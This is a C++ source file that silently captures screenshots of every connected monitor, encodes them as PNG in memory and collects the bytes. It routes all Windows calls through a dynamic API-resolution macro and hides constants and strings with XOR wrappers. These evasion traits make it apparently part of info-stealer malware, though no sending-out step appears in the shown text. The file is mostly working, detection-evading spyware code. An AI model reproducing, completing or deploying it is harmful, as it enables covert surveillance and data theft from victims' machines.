#include "Common.h"

static int GetEncoderClsid(WCHAR* format, CLSID* pClsid)
{
	unsigned int num = 0, size = 0;
	API(GDIPLUS, GdipGetImageEncodersSize)(&num, &size);
	if (!size) return -1;

	ImageCodecInfo* pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
	if (!pImageCodecInfo) return -1;

	API(GDIPLUS, GdipGetImageEncoders)(num, size, pImageCodecInfo);

	for (size_t i = 0; i < num; i++)
	{
		if (wcscmp(pImageCodecInfo[i].MimeType, format) == 0)
		{
			*pClsid = pImageCodecInfo[i].Clsid;
			free(pImageCodecInfo);
			return i;
		}
	}

	free(pImageCodecInfo);
	return -1;
}

static BOOL CALLBACK MonitorEnumProcCallback(HMONITOR hMonitor, HDC DevC, LPRECT lprcMonitor, LPARAM dwData)
{
	ScreenshotRoutine* routine = (ScreenshotRoutine*)dwData;

	MONITORINFOEX info;
	info.cbSize = sizeof(MONITORINFOEX);
	if (!API(USER32, GetMonitorInfoA)(hMonitor, &info)) return FALSE;

	ULONG_PTR gdiplusToken;
	GdiplusStartupInput gdiplusStartupInput;
	API(GDIPLUS, GdiplusStartup)(&gdiplusToken, &gdiplusStartupInput, NULL);

	HDC dc = API(GDI32, CreateDCA)(NULL, info.szDevice, NULL, NULL);

	int w = info.rcMonitor.right - info.rcMonitor.left;
	int h = info.rcMonitor.bottom - info.rcMonitor.top;

	WORD nBPP = API(GDI32, GetDeviceCaps)(dc, XorInt(BITSPIXEL));
	HDC hdcCapture = API(GDI32, CreateCompatibleDC)(dc);

	BITMAPINFO bmiCapture = {
		XorInt(sizeof(BITMAPINFOHEADER)),
		w,
		-h,
		XorInt(1),
		nBPP,
		XorInt(BI_RGB), 0, 0, 0, 0, 0,
	};

	LPBYTE lpCapture;
	HBITMAP hbmCapture = API(GDI32, CreateDIBSection)(dc, &bmiCapture, DIB_PAL_COLORS, (LPVOID*)&lpCapture, NULL, 0);
	if (!hbmCapture)
	{
		API(GDI32, DeleteDC)(hdcCapture);
		API(GDI32, DeleteDC)(dc);
		API(GDIPLUS, GdiplusShutdown)(gdiplusToken);
		return FALSE;
	}

	int nCapture = API(GDI32, SaveDC)(hdcCapture);
	API(GDI32, SelectObject)(hdcCapture, hbmCapture);
	API(GDI32, BitBlt)(hdcCapture, 0, 0, w, h, dc, 0, 0, XorInt(SRCCOPY));
	API(GDI32, RestoreDC)(hdcCapture, nCapture);
	API(GDI32, DeleteDC)(hdcCapture);
	API(GDI32, DeleteDC)(dc);

	CLSID imageCLSID;
	GetEncoderClsid(Utils::ToUnicode(XorStr("image/png")), &imageCLSID);

	BitmapC* pScreenShot = new BitmapC(hbmCapture, (HPALETTE)0);
	if (!pScreenShot)
	{
		delete pScreenShot;
		return FALSE;
	}

	IStream* pStream = NULL;
	API(OLE32, CreateStreamOnHGlobal)(NULL, XorInt(TRUE), &pStream);
	if (!pStream)
	{
		delete pScreenShot;
		return FALSE;
	}

	pScreenShot->Save(pStream, &imageCLSID);
	delete pScreenShot;

	LARGE_INTEGER liZero = { };
	ULARGE_INTEGER pos = { };
	STATSTG stg = { };
	pStream->Seek(liZero, (DWORD)XorInt((DWORD)STREAM_SEEK_SET), &pos);
	pStream->Stat(&stg, (DWORD)XorInt((DWORD)STATFLAG_NONAME));

	DWORD screenSize = stg.cbSize.LowPart;
	char* buffer = (char*)malloc(stg.cbSize.LowPart);
	if (!buffer)
	{
		pStream->Release();
		return FALSE;
	}

	ULONG bytesRead = 0;
	pStream->Read(buffer, stg.cbSize.LowPart, &bytesRead);
	pStream->Release();

	routine->screens.push_back(string(buffer, bytesRead));

	free(buffer);
	API(GDI32, DeleteObject)(hbmCapture);
	API(GDIPLUS, GdiplusShutdown)(gdiplusToken);

	return TRUE;
}

void Screenshot::Get(vector<string>& screens)
{
	HDC hDc = API(USER32, GetDC)(NULL);
	if (!hDc) return;

	ScreenshotRoutine routine = { screens };
	API(USER32, EnumDisplayMonitors)(hDc, NULL, MonitorEnumProcCallback, (LPARAM)&routine);
}